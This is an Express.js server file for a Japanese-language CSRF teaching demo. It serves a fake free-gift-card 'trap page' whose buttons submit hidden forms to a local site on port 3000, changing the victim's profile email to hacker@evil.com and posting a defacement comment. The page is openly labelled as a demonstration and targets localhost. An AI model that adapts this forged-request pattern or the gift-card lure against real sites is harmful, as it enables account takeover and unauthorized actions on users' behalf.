import express from 'express';
const app = express();
const port = 3001;

app.use(express.static('public'));

// 罠ページ
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>🎁 無料ギフトカードプレゼント！</title>
      <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
        .warning { background: #ffe6e6; border: 2px solid #ff4444; padding: 20px; margin: 20px 0; border-radius: 8px; }
        .attack-btn { background: #ff4444; color: white; padding: 15px 30px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; margin: 10px; }
        .info { background: #e6f3ff; border: 1px solid #44aaff; padding: 15px; margin: 20px 0; border-radius: 8px; }
      </style>
    </head>
    <body>
      <h1>🎁 無料ギフトカードプレゼント！</h1>
      <p>下のボタンをクリックして、無料のギフトカードを受け取ってください！</p>
      
      <div class="warning">
        <h3>⚠️ これはCSRF攻撃のデモです</h3>
        <p>実際の攻撃ではありません。メインサイト（ポート3000）でログインした状態で、このボタンをクリックすると、勝手にプロフィールが更新されます。</p>
      </div>
      
      <!-- 見た目は無害だが、実際にはCSRF攻撃を実行 -->
      <button class="attack-btn" id="attack1-btn">🚨 プロフィールを勝手に更新（攻撃1）</button>
      <button class="attack-btn" id="attack2-btn">🚨 不正なコメントを投稿（攻撃2）</button>
      
      <div class="info">
        <h4>🔍 攻撃の流れ</h4>
        <p>1. メインサイト（<a href="http://localhost:3000" target="_blank">http://localhost:3000</a>）でログイン</p>
        <p>2. この罠ページを開く</p>
        <p>3. 上記のボタンをクリック</p>
        <p>4. メインサイトに戻ると、データが勝手に更新されている！</p>
      </div>
      
      <script>
        // デバッグ用: ページ読み込み完了を確認
        console.log('🎣 罠ページが読み込まれました');
        
        // 攻撃1: プロフィール更新
        function attack1() {
          console.log('🚨 攻撃1を実行します');
          try {
            alert('🚨 CSRF攻撃を実行します！\\n\\nメインサイトのプロフィールが勝手に更新されます。');
            
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://localhost:3000/update-profile';
            
            const emailInput = document.createElement('input');
            emailInput.type = 'hidden';
            emailInput.name = 'email';
            emailInput.value = 'hacker@evil.com';
            
            form.appendChild(emailInput);
            document.body.appendChild(form);
            
            console.log('フォームを作成しました:', form);
            form.submit();
            console.log('フォームを送信しました');
          } catch (error) {
            console.error('攻撃1でエラーが発生しました:', error);
            alert('エラーが発生しました: ' + error.message);
          }
        }
        
        // 攻撃2: 不正なコメント投稿
        function attack2() {
          console.log('🚨 攻撃2を実行します');
          try {
            alert('🚨 CSRF攻撃を実行します！\\n\\nメインサイトに不正なコメントが勝手に投稿されます。');
            
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://localhost:3000/post-comment';
            
            const commentInput = document.createElement('input');
            commentInput.type = 'hidden';
            commentInput.name = 'comment';
            commentInput.value = 'このサイトはハッキングされました！攻撃者からのメッセージです。';
            
            form.appendChild(commentInput);
            document.body.appendChild(form);
            
            console.log('フォームを作成しました:', form);
            form.submit();
            console.log('フォームを送信しました');
          } catch (error) {
            console.error('攻撃2でエラーが発生しました:', error);
            alert('エラーが発生しました: ' + error.message);
          }
        }
        
        // ボタンが正しく読み込まれているか確認
        window.onload = function() {
          console.log('ページの読み込みが完了しました');
          console.log('attack1関数:', typeof attack1);
          console.log('attack2関数:', typeof attack2);
          
          // ボタンにイベントリスナーを追加（onclickの代替）
          const btn1 = document.getElementById('attack1-btn');
          const btn2 = document.getElementById('attack2-btn');
          
          if (btn1) {
            console.log('攻撃1ボタンが見つかりました');
            btn1.addEventListener('click', attack1);
          }
          
          if (btn2) {
            console.log('攻撃2ボタンが見つかりました');
            btn2.addEventListener('click', attack2);
          }
        };
      </script>
    </body>
    </html>
  `);
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});